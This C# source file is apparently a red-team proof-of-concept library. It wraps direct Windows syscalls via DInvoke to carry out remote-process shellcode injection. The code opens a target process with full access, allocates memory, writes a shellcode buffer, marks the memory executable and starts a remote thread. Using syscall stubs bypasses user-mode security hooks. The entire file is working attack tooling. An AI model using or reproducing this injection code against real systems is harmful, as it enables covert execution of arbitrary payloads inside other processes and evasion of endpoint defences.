using System;
using System.Runtime.InteropServices;

using DInvoke.DynamicInvoke;
using Data = DInvoke.Data;

namespace PoCLibrary
{
    public static class Syscalls
    {
        public static IntPtr OpenProcess(int pid)
        {
            var ptr = Generic.GetSyscallStub("NtOpenProcess");
            var ntOpenProcess = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtOpenProcess)) as Native.DELEGATES.NtOpenProcess;

            var oa = new Data.Native.OBJECT_ATTRIBUTES();
            var cid = new Data.Native.CLIENT_ID
            {
                UniqueProcess = (IntPtr)pid
            };

            var hProcess = IntPtr.Zero;

            _ = (uint)ntOpenProcess(
                ref hProcess,
                Data.Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS,
                ref oa,
                ref cid);

            return hProcess;
        }

        public static IntPtr AllocateMemory(IntPtr hProcess, IntPtr regionSize)
        {
            var ptr = Generic.GetSyscallStub("NtAllocateVirtualMemory");
            var ntAllocateVirtualMemory = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtAllocateVirtualMemory)) as Native.DELEGATES.NtAllocateVirtualMemory;

            var hMemory = IntPtr.Zero;

            ntAllocateVirtualMemory(
                hProcess,
                ref hMemory,
                IntPtr.Zero,
                ref regionSize,
                Data.Win32.Kernel32.MEM_COMMIT | Data.Win32.Kernel32.MEM_RESERVE,
                Data.Win32.WinNT.PAGE_READWRITE);

            return hMemory;
        }

        public static bool WriteMemory(IntPtr hProcess, IntPtr hMemory, byte[] shellcode)
        {
            var ptr = Generic.GetSyscallStub("NtWriteVirtualMemory");
            var ntWriteVirtualMemory = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtWriteVirtualMemory)) as Native.DELEGATES.NtWriteVirtualMemory;

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint written = 0;

            var status = ntWriteVirtualMemory(
                hProcess,
                hMemory,
                buffer,
                (uint)shellcode.Length,
                ref written);

            return status == 0;
        }

        public static bool ProtectMemory(IntPtr hProcess, IntPtr hMemory, IntPtr regionSize)
        {
            var ptr = Generic.GetSyscallStub("NtProtectVirtualMemory");
            var ntProtectVirtualMemory = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtProtectVirtualMemory)) as Native.DELEGATES.NtProtectVirtualMemory;

            uint old = 0;

            var status = ntProtectVirtualMemory(
                hProcess,
                ref hMemory,
                ref regionSize,
                Data.Win32.WinNT.PAGE_EXECUTE_READ,
                ref old);

            return status == 0;
        }

        public static bool CreateThread(IntPtr hProcess, IntPtr hMemory)
        {
            var ptr = Generic.GetSyscallStub("NtCreateThreadEx");
            var ntCreateThreadEx = Marshal.GetDelegateForFunctionPointer(ptr, typeof(Native.DELEGATES.NtCreateThreadEx)) as Native.DELEGATES.NtCreateThreadEx;

            var status = ntCreateThreadEx(
                out var hThread,
                Data.Win32.WinNT.ACCESS_MASK.GENERIC_ALL,
                IntPtr.Zero,
                hProcess,
                hMemory,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);

            return status == 0;
        }
    }
}
